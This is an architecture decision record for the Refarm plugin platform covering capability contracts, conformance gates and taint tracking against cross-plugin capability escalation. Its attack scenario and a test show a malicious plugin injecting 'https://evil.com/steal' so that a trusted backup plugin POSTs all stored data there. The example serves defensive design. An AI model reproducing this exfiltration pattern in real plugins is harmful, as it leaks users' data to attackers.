# ADR-018: Capability Contracts and Observability Gates

**Status**: Accepted  
**Date**: 2026-03-07  
**Deciders**: Refarm core maintainers  
**Related**: ADR-007, ADR-013, ADR-017

---

## Context

A plugin-first architecture only works safely when every plugin implementation is measurable, verifiable, and replaceable.

Refarm explicitly requires:

- third-party alternative backends
- strict production observability
- reliable swap between providers without app rewrites

Without enforceable contracts and telemetry gates, ecosystem scale causes runtime fragility and opaque failures.

---

## Decision

**We will enforce capability contracts with mandatory observability hooks and conformance tests before plugin admission.**

### Contract model

Each capability MUST define:

1. versioned API (`capability:vN`)
2. functional semantics (expected behavior)
3. error model (typed codes)
4. performance expectations (SLO hints)
5. required telemetry events/metrics

### Admission model

A plugin implementation is admissible only if it passes:

1. conformance tests (functional)
2. telemetry compliance tests
3. safety checks (capabilities/permissions)
4. compatibility checks (manifest + semver)

---

## Alternatives Considered

### Option 1: Best-effort plugin quality (no gates)

**Pros:**

- fastest onboarding
- low process overhead

**Cons:**

- inconsistent behavior
- poor diagnosability
- high operational risk

### Option 2: Manual review-only governance

**Pros:**

- flexible policy interpretation
- moderate setup effort

**Cons:**

- non-scalable
- subjective quality
- delayed incident detection

### Chosen: Option 3 (Automated contracts + observability gates)

**Rationale**: scalable, objective, and aligned with a high-reliability ecosystem.

---

## Consequences

**Positive:**

- deterministic integration quality
- improved incident triage and root-cause speed
- portable plugin ecosystem with stronger trust

**Negative:**

- higher initial SDK and tooling investment
- stricter entry barrier for third-party authors

**Risks:**

- over-constrained innovation (mitigation: evolve contracts via versioning)
- observability overhead (mitigation: lightweight structured event schema)

---

## Implementation

**Affected components:**

- capability specs and SDK packages
- CI quality gates for plugin packages
- inspector tooling for telemetry validation

**Migration path:**

1. establish `storage:v1` as reference contract
2. ship conformance runner in repo
3. enforce conformance in CI for internal implementations
4. publish third-party authoring guide

**Timeline:** starts in v0.1.x foundation phase, extends continuously.

---

## Extension: Transitive Capability Escalation Prevention

**Problem learned from ecosystems** (Browser extensions, npm packages, Unity assets):

Plugin A (trusted, has `network:fetch`) loads data from Plugin B (untrusted) → Plugin B can hijack Plugin A's capabilities.

### Attack Scenario

```typescript
// Plugin A: Backup Plugin (trusted, has network:fetch)
{
  "id": "io.refarm.backup",
  "capabilities": ["network:fetch", "storage:read"]
}

// Plugin A implementation
async function backup() {
  // Reads config from graph (created by Plugin B)
  const config = await graph.query({ type: 'backup-config' });
  
  // Uses config.url (controlled by Plugin B!)
  await fetch(config.url, {
    method: 'POST',
    body: JSON.stringify(await storage.readAll())  // Exfiltrates all data!
  });
}

// Plugin B: Malicious Config Plugin (no network capability)
{
  "id": "malicious.config",
  "capabilities": ["storage:write"]  // Only write to graph
}

// Plugin B implementation
async function setup() {
  // Injects malicious URL
  await graph.upsertNode({
    type: 'backup-config',
    url: 'https://evil.com/steal'  // Plugin A will use this!
  });
}
```

**Result**: Plugin B (no network) successfully exfiltrates data by hijacking Plugin A's `network:fetch` capability.

### Solution: Data Provenance Tracking

Kernel tracks **which plugin created which data**:

```typescript
// apps/kernel/src/provenance-tracker.ts

class ProvenanceTracker {
  /**
   * Track data origin when plugin writes to graph
   */
  async trackWrite(nodeId: string, pluginId: string, data: any) {
    // Store metadata: who created this data
    await this.metadata.set(nodeId, {
      createdBy: pluginId,
      createdAt: Date.now(),
      tainted: pluginId !== 'kernel'  // Data from plugins is "tainted"
    });
  }
  
  /**
   * Check if data is tainted when used in capability operation
   */
  async checkTaint(
    pluginId: string,
    capability: string,
    dataNodeId: string
  ): Promise<TaintCheck> {
    const metadata = await this.metadata.get(dataNodeId);
    
    if (!metadata?.tainted) {
      // Data from kernel or user → safe
      return { tainted: false };
    }
    
    if (metadata.createdBy === pluginId) {
      // Plugin using its own data → safe
      return { tainted: false };
    }
    
    // Plugin using another plugin's data in capability operation → TAINTED
    return {
      tainted: true,
      source: metadata.createdBy,
      requiresApproval: true
    };
  }
}
```

### Capability Execution with Taint Checking

```typescript
// apps/kernel/src/capability-executor.ts

class CapabilityExecutor {
  /**
   * Execute capability operation with taint checking
   */
  async execute(
    pluginId: string,
    capability: string,
    operation: string,
    args: any
  ) {
    // Extract data dependencies from args
    const dataDeps = this.extractDataDependencies(args);
    
    // Check if any data is tainted
    for (const nodeId of dataDeps) {
      const taintCheck = await this.provenanceTracker.checkTaint(
        pluginId,
        capability,
        nodeId
      );
      
      if (taintCheck.tainted && taintCheck.requiresApproval) {
        // TAINTED DATA IN CAPABILITY OPERATION
        
        // Ask user for approval
        const approved = await this.askUserApproval({
          pluginId,
          capability,
          operation,
          taintedData: nodeId,
          createdBy: taintCheck.source,
          message: `Plugin "${pluginId}" wants to use data from "${taintCheck.source}" in a ${capability} operation. Allow?`
        });
        
        if (!approved) {
          throw new SecurityError(
            `Plugin "${pluginId}" attempted to use tainted data from "${taintCheck.source}" in ${capability} operation without user approval`
          );
        }
        
        // User approved, log for audit trail
        await this.auditLog.record({
          type: 'tainted-capability-use',
          pluginId,
          capability,
          taintSource: taintCheck.source,
          approved: true,
          timestamp: Date.now()
        });
      }
    }
    
    // Safe to proceed
    return await this.executeCapability(pluginId, capability, operation, args);
  }
  
  /**
   * Extract node IDs that args depend on
   */
  private extractDataDependencies(args: any): string[] {
    const deps: string[] = [];
    
    // Deep traverse args to find node references
    const traverse = (obj: any) => {
      if (typeof obj === 'string' && obj.startsWith('node-')) {
        deps.push(obj);
      } else if (typeof obj === 'object' && obj !== null) {
        for (const value of Object.values(obj)) {
          traverse(value);
        }
      }
    };
    
    traverse(args);
    return deps;
  }
}
```

### User Experience: Approval Dialog

```
┌─────────────────────────────────────────────────────────────┐
│ 🔒 SECURITY APPROVAL REQUIRED                                │
│                                                              │
│ Plugin "Backup Plugin" wants to use data created by         │
│ "Malicious Config Plugin" in a network operation.           │
│                                                              │
│ Details:                                                     │
│   Capability: network:fetch                                  │
│   Operation: POST to https://evil.com/steal                 │
│   Data Source: backup-config (created by malicious.config)  │
│                                                              │
│ ⚠️  WARNING: This could allow "Malicious Config Plugin"     │
│    to access network capabilities it doesn't have.           │
│                                                              │
│ Do you trust "Malicious Config Plugin" with network access? │
│                                                              │
│ [Show Data] [Deny] [Allow Once] [Always Allow]              │
└─────────────────────────────────────────────────────────────┘
```

### Refined Rules

1. **Kernel/User data is untainted**: Data from kernel or user input is safe
2. **Self-created data is untainted**: Plugin can use its own data freely
3. **Cross-plugin data is tainted**: Using data from Plugin B requires approval
4. **Approval is per-capability**: User approves "Plugin A using Plugin B's data in network:fetch"
5. **Audit trail**: All tainted operations logged (even if approved)

### Escape Hatch: Explicit Trust

Plugin can declare trusted sources in manifest:

```jsonc
{
  "id": "io.refarm.backup",
  "capabilities": ["network:fetch", "storage:read"],
  
  "trustedDataSources": [
    "io.refarm.official-config"  // Pre-approved, no runtime check
  ]
}
```

User sees this during install:

```
Plugin "Backup Plugin" will automatically trust data from:
  • Official Config Plugin

This means "Official Config Plugin" can control how "Backup Plugin"
uses its network capabilities.

Only approve if you trust "Official Config Plugin".

[Show Details] [Cancel] [Install]
```

### Testing Taint Checking

```typescript
test('using tainted data in capability requires approval', async () => {
  // Plugin A has network:fetch
  const pluginA = await kernel.loadPlugin({
    id: 'plugin-a',
    capabilities: ['network:fetch']
  });
  
  // Plugin B has storage:write (no network)
  const pluginB = await kernel.loadPlugin({
    id: 'plugin-b',
    capabilities: ['storage:write']
  });
  
  // Plugin B writes config
  await pluginB.execute('writeConfig', {
    url: 'https://evil.com/steal'
  });
  
  // Plugin A tries to use Plugin B's config
  const fetchPromise = pluginA.execute('fetch', {
    url: '{{ graph.query("config").url }}'  // Uses Plugin B's data
  });
  
  // Should require user approval
  await expect(fetchPromise).rejects.toThrow(SecurityError);
  
  // Approval dialog should have been shown
  const approvalRequest = kernel.getLastApprovalRequest();
  expect(approvalRequest.pluginId).toBe('plugin-a');
  expect(approvalRequest.taintSource).toBe('plugin-b');
  expect(approvalRequest.capability).toBe('network:fetch');
});
```

### Performance Considerations

**Concern**: Tracking provenance for every graph modification has overhead.

**Mitigation**:
1. **Lazy tracking**: Only track when plugins installed (if no plugins, no overhead)
2. **In-memory cache**: Recent writes cached (LRU 10k entries)
3. **Bloom filters**: Fast "likely tainted" check before full lookup
4. **Batch checks**: Check taint for batch of operations once

**Benchmark Target**: < 5ms overhead per capability operation (amortized)

### Benefits

1. **Prevents capability escalation**: Plugin B can't hijack Plugin A's capabilities
2. **User visibility**: User knows when cross-plugin dependencies exist
3. **Audit trail**: Log shows exactly which plugin controlled which operation
4. **Explicit trust**: Advanced users can pre-approve trusted sources

---

## References

- [docs/PR_QUALITY_GOVERNANCE.md](../../docs/PR_QUALITY_GOVERNANCE.md)
- [docs/WORKFLOW.md](../../docs/WORKFLOW.md)
- [OpenTelemetry semantic conventions](https://opentelemetry.io/docs/specs/)
